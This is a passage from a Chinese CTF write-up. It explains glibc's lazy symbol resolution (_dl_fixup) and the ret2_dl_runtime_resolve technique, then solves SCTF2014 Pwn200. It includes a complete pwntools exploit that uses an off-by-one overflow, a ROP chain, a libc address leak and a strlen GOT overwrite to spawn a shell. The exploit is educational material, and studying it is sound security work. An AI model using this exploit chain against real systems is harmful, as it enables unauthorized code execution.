sym-&gt;st_name为所解析函数的符号在字符串表中的地址，result为定义函数的共享对象的加载基地址</span></span><br><span class="line">        <span class="comment">//_dl_lookup_symbol_x的功能是在加载的共享对象的符号表中搜索符号的定义，其参数也许带有该符号的版本。</span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">/* 我们已经完成了全局范围的工作。 */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">            RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 当前result包含定义sym的共享对象的加载基地址（或link map）。 现在添加符号偏移量。 */</span></span><br><span class="line">        <span class="comment">//value为所求函数的真实内存地址</span></span><br><span class="line">        <span class="comment">//SYMBOL_ADDRESS(map, ref, map_set)：如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。 </span></span><br><span class="line">        <span class="comment">//如果MAP_SET为TRUE，请勿检查NULL映射。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//未使用常规查找规则</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 我们已经找到了符号。 模块（及其加载地址）也是已知的。 */</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//elf_machine_plt_value返回PLT重定位的最终值。在x86-64上JUMP_SLOT重定位忽略addend。</span></span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line">    <span class="comment">/* 最后，修复PLT本身。 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">//向所查找函数对应的GOT表中填写找到的函数的真实地址。</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>_dl_fixup(l，reloc_arg)</code>有两个参数，<strong><code>l</code></strong>是link_map结构的指针，<strong><code>reloc_arg</code></strong>是所解析函数的<code>重定位项</code>在<code>重定位表.rel.plt</code>中的<code>偏移</code>或<code>下标</code>。<strong><code>32位</code></strong>的<code>reloc_arg</code>和<strong><code>64位</code></strong>的有区别：32位使用<code>reloc_offset</code>, 64位使用<code>reloc_index</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;上面几句的作用是从<strong><code>link_map</code></strong>结构中获取<code>动态链接符号表“.dynsym”</code>、<code>动态链接字符串表“.dynstr”</code>的<code>首地址</code>，<code>重定位表“.rel.plt”</code>中所求函数的<code>重定位项</code>的地址，所求函数在<code>动态链接符号表“.dynsym”</code>中<code>对应项的地址</code>，以及重定位<code>需要修改内容</code>的地址<code>rel_addr</code>。<br>&emsp;&emsp;接下来主要是调用了<strong><code>_dl_lookup_symbol_x()</code></strong>函数，<code>_dl_lookup_symbol_x()</code>的功能是在<code>加载的共享对象的符号表</code>中<code>搜索符号的定义</code>，其<code>参数</code>也许带有<code>该符号的版本</code>。它的<code>返回值</code>为定义所求函数的<code>共享对象的加载基址</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strtab + sym-&gt;st_name为所解析函数的符号在字符串表中的地址，result为定义函数的共享对象的加载基地址</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x的功能是在加载的共享对象的符号表中搜索符号的定义，其参数也许带有该符号的版本。</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, </span><br><span class="line">    l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong><code>_dl_lookup_symbol_x()</code></strong>函数的内容比较多，这里就不详细介绍了，准备再写一篇文章，详细介绍Linux下库函数的动态链接过程。其有<strong><code>8个参数</code></strong>：</p>
<blockquote>
<ul>
<li><strong><code>参数1</code></strong>：<code>strtab + sym-&gt;st_name</code>，是指向所要重定位的符号的字符串的指针。</li>
<li><strong><code>参数2</code></strong>：<code>l</code>，_dl_fixup()函数传进来的link_map结构体链表指针，目前指向第一个结点，即可执行文件对应的链表结点。</li>
<li><strong><code>参数3</code></strong>：<code>&amp;sym</code>，sym是一个Elf32_Sym类型的结构体对象指针，其指向的是所求函数在动态链接符号表.dynsym中对应符号项。而&amp;sym是这个结构体对象指针的地址。</li>
<li><strong><code>参数4</code></strong>：<code>l-&gt;l_scope</code>，此link map的查找范围(maps的范围)的指针数组。</li>
<li><strong><code>参数5</code></strong>：<code>version</code>，所搜索函数的符号版本结构体对象指针。</li>
<li><strong><code>参数6</code></strong>：<code>ELF_RTYPE_CLASS_PLT</code>，重定位elf_machine_type_class()返回的类型类。</li>
<li><strong><code>参数7</code></strong>：<code>flags</code>，标志变量。暂时没搞清楚功能。</li>
<li><strong><code>参数8</code></strong>：<code>*skip_map</code>，需要跳过的、不用搜索的link_map结构体指针。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;<strong><code>_dl_lookup_symbol_x()</code></strong>函数的<code>返回值result</code>为定义函数的<code>共享对象的加载基址</code>。之后我们可以看到使用了<code>DL_FIXUP_MAKE_VALUE()</code>这个宏定义：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 当前result包含定义sym的共享对象的加载基地址（或link map）。 现在添加符号偏移量。 */</span></span><br><span class="line"><span class="comment">//value为所求函数的真实内存地址</span></span><br><span class="line"><span class="comment">//SYMBOL_ADDRESS(map, ref, map_set)：如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。 </span></span><br><span class="line"><span class="comment">//如果MAP_SET为TRUE，请勿检查NULL映射。</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result,SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 根据地址和link_map构造修正值 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (map) ? ((struct fdesc)&#123;(addr),(map)-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr &#125;) : ((struct fdesc) &#123; 0, 0 &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。如果MAP_SET为TRUE，请勿检查NULL映射。  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set) ((ref) == NULL ? 0 : (__glibc_unlikely((ref)-&gt;st_shndx == SHN_ABS) ? 0 : LOOKUP_VALUE_ADDRESS(map, map_set)) + (ref)-&gt;st_value)</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;通过此宏定义，我们可以得到<code>所求符号的真实内存地址</code>，即<strong><code>value</code></strong>。通过一层层宏定义，我们可以知道，<code>符号的真实地址</code>是存在符号项中的<code>st_value</code>中的。之后，通过调用<code>elf_machine_fixup_plt()</code>函数<code>修复GOT表</code>，将<code>重定位函数的真实地址</code>写入可执行文件中<code>函数对应的GOT表项</code>中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向所查找函数对应的GOT表中填写找到的函数的真实地址。</span></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">ElfW</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"><span class="title">elf_machine_fixup_plt</span> <span class="params">(struct link_map *<span class="built_in">map</span>, <span class="keyword">lookup_t</span> t,</span></span></span><br><span class="line">                       const ElfW(Sym) *refsym, const ElfW(Sym) *sym,</span><br><span class="line">                       const ElfW(Rela) *reloc,</span><br><span class="line">                       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="4、真题解析"><a href="#4、真题解析" class="headerlink" title="4、真题解析"></a>4、真题解析</h2><h3 id="4-0、ret2-dl-runtime-resolve适用情况"><a href="#4-0、ret2-dl-runtime-resolve适用情况" class="headerlink" title="4.0、ret2_dl_runtime_resolve适用情况"></a>4.0、ret2_dl_runtime_resolve适用情况</h3><blockquote>
<ul>
<li><strong><code>条件1</code></strong>：题目<code>未给出libc库</code>。</li>
<li><strong><code>条件2</code></strong>：程序<code>未开启PIE保护</code>。如果<code>开启了PIE保护</code>，则还需要通过泄露获取基地址。</li>
<li><strong><code>条件3</code></strong>：程序<code>未开启FULL RELRO</code>。</li>
</ul>
</blockquote>
<h3 id="4-1、ret2-dl-runtime-resolve利用方式"><a href="#4-1、ret2-dl-runtime-resolve利用方式" class="headerlink" title="4.1、ret2_dl_runtime_resolve利用方式"></a>4.1、ret2_dl_runtime_resolve利用方式</h3><h3 id="4-2、x86的情况——SCTF2014-Pwn200"><a href="#4-2、x86的情况——SCTF2014-Pwn200" class="headerlink" title="4.2、x86的情况——SCTF2014  Pwn200"></a>4.2、x86的情况——SCTF2014  Pwn200</h3><h4 id="1、检查程序开启的保护机制"><a href="#1、检查程序开启的保护机制" class="headerlink" title="1、检查程序开启的保护机制"></a>1、检查程序开启的保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn200</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/pwn200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>可以看到此程序只开启了<code>NX(堆栈不可执行)</code>。</p>
<h4 id="2、静态分析"><a href="#2、静态分析" class="headerlink" title="2、静态分析"></a>2、静态分析</h4><p>IDA反编译后<code>主函数</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> main1()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> slogan; <span class="comment">// [esp+1Ch] [ebp-9Ch] 0x80 = 128</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>]; <span class="comment">// [esp+9Ch] [ebp-1Ch]</span></span><br><span class="line">    <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+ACh] [ebp-Ch] 32程序size_t大小为4bytes</span></span><br><span class="line">    </span><br><span class="line">    nbytes = <span class="number">16</span>;</span><br><span class="line">    *name = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;slogan, <span class="number">0</span>, <span class="number">128u</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">12u</span>);</span><br><span class="line">    <span class="comment">// name的大小为16byte,多读一个字节,覆盖了后面的数据</span></span><br><span class="line">    read(<span class="number">0</span>, name, nbytes + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查输入长度,name输入长度最长为10byte,并且name前8个字节为"syclover"</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(name) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, name, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">14u</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;slogan, nbytes);</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, &amp;slogan, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们通过分析，可以知道，程序需要<strong><code>两次输入</code></strong>，<strong><code>第一次</code></strong>输入“name”，<strong><code>第二次</code></strong>输入“slogan”。<code>name</code>的大小为<code>16byte</code>，但是程序在读取输入的时候，最多可以读取<code>17byte</code>，多了一个字节，这会<code>覆盖后面的nbytes</code>。如果覆盖为<code>0xFF</code>，则会在后面从标准输入<code>读取“slogan”</code>的时候，<code>读取的最大长度</code>变为<code>255byte</code>，而“slogan”的<code>实际大小</code>只有<code>128byte</code>，这就会导致覆盖栈上的函数的<code>EBP</code>和<code>返回地址</code>。如果输入的数据是经过<code>精心构造</code>过的，就可以<code>劫持程序的控制流</code>。</p>
<p>&emsp;&emsp;在<code>“name”</code>输入完后，程序会对输入的<code>长度</code>和<code>内容</code>进行判断。长度最长为<code>10byte</code>，并且<code>前8个字节</code>为<code>“syclover”</code>。我们可以使用<code>“\x00”截断</code>，对长度判断进行绕过。</p>
<h4 id="3、方法一：使用题目提供的libc库，进行利用"><a href="#3、方法一：使用题目提供的libc库，进行利用" class="headerlink" title="3、方法一：使用题目提供的libc库，进行利用"></a>3、方法一：使用题目提供的libc库，进行利用</h4><p><strong><code>利用思路：</code></strong></p>
<ul>
<li>1、程序从<code>标准输入</code>读取<code>“name”</code>的时候，利用<code>“\x00”</code>绕过<code>strlen()</code>的长度验证，输入构造的<code>17bytes</code>数据，将<code>nbytes</code>修改为<code>“0xFF”</code>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"syclover\x00\xff\xff\xff\xff\xff\xff\xff\xff"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>2、程序从<code>标准输入</code>读取<code>“slogan”</code>的时候，输入精心构造的<code>一段ROP的shellcode</code>，劫持程序的控制流。首先利用<code>write函数</code>泄露出<code>read函数的地址</code>，然后根据<code>libc</code>中<code>read函数</code>和<code>system函数</code>的相对偏移，计算出<code>system函数的真实地址</code>。再通过<code>read函数</code>修改<code>strlen的GOT表</code>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(write_plt) + p32(ppp_ret) + p32(<span class="number">0x01</span>) + p32(read_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0x00</span>) + p32(strlen_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">shellcode += p32(main_addr)</span><br><span class="line">ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0x04</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure>
<ul>
<li>3、程序再次从<code>标准输入</code>读取<code>“name”</code>的时候，传入字符串<code>“/bin/sh”</code>。当执行到<code>strlen函数</code>的时候，实际上执行的是<code>system函数</code>，参数即为<code>“/bin/sh”</code>。</li>
</ul>
<p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary =<span class="string">'./pwn200'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'218.2.197.235'</span>,<span class="number">10101</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./pwn200','''</span></span><br><span class="line">        <span class="comment">#                             bp 0x080484AC</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048507</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048524</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048579</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048596</span></span><br><span class="line">        <span class="comment">#                             bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment">#                 bp 0x080484AC</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048507</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048524</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048579</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048596</span></span><br><span class="line">    <span class="comment">#                 bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw_input('[1] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[2] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="comment"># raw_input('[3] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line"></span><br><span class="line">    ppp_ret = <span class="number">0x08048646</span></span><br><span class="line">    write_plt = <span class="number">0x080483A0</span></span><br><span class="line">    read_plt = <span class="number">0x08048360</span></span><br><span class="line">    read_got = <span class="number">0x08049850</span></span><br><span class="line">    strlen_got = <span class="number">0x08049858</span></span><br><span class="line">    main_addr = <span class="number">0x080484AC</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(write_plt) + p32(ppp_ret) + p32(<span class="number">0x01</span>) + p32(read_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0x00</span>) + p32(strlen_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">    shellcode += p32(main_addr)</span><br><span class="line">    ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0x04</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[4] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw_input('[5] before receive write_data')</span></span><br><span class="line">    write_data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> write_data]</span><br><span class="line">    <span class="comment"># raw_input('[6] before receive read_addr_data')</span></span><br><span class="line">    read_addr_data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> read_addr_data]</span><br><span class="line">    read_addr = u32(read_addr_data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read_addr:"</span>,hex(read_addr)</span><br><span class="line">    <span class="comment">#libc_info = ELF("./libc.so",checksec = False)</span></span><br><span class="line">    libc_info = ELF(<span class="string">"./libc-2.23.so"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">    system_offset = libc_info.symbols[<span class="string">"system"</span>]</span><br><span class="line">    read_offset = libc_info.symbols[<span class="string">"read"</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_offset:"</span>,hex(system_offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read_offset:"</span>,hex(read_offset)</span><br><span class="line"></span><br><span class="line">    libc_addr = read_addr - read_offset</span><br><span class="line">    system_addr = libc_addr + system_offset</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span> + hex(system_addr)</span><br><span class="line">    <span class="comment"># raw_input('[7] before send system_addr')</span></span><br><span class="line">    io.send(p32(system_addr))</span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[8] before send "/bin/sh"')</span></span><br><span class="line">    io.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    io.interactive(prompt = pwnlib.term.text.bold_red(<span class="string">'$'</span>) + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p>
<h4 id="4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用"><a href="#4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用" class="headerlink" title="4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用"></a>4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用</h4><p><strong><code>利用思路：</code></strong></p>
<ul>
<li>1、程序从<code>标准输入</code>读取<strong><code>“name”</code></strong>的时候，利用<code>“\x00”</code>绕过<code>strlen()</code>的长度验证，输入构造的<code>17bytes</code>数据，将<code>nbytes</code>修改为<code>“0xFF”</code>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"syclover\x00\xff\xff\xff\xff\xff\xff\xff\xff"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>2、程序从<code>标准输入</code>读取<strong><code>“slogan”</code></strong>的时候，输入精心构造的<code>一段ROP的shellcode</code>，劫持程序的<code>控制流</code>。我们使用<code>read函数</code>将伪造的<strong><code>system函数</code></strong>的<strong><code>重定位表项数据</code></strong>、<strong><code>符号表项数据</code></strong>、<strong><code>字符串表项数据</code></strong>以及<strong><code>参数“/bin/sh”</code></strong>写入到内存中的<code>可写区域</code>，这里选择<code>bss节</code>之后的区域。 然后，返回到<code>main函数</code>，进行<code>下一次payload</code>的传递，用于解析<code>system函数</code>地址，并<code>调用system函数</code>。</li>
</ul>
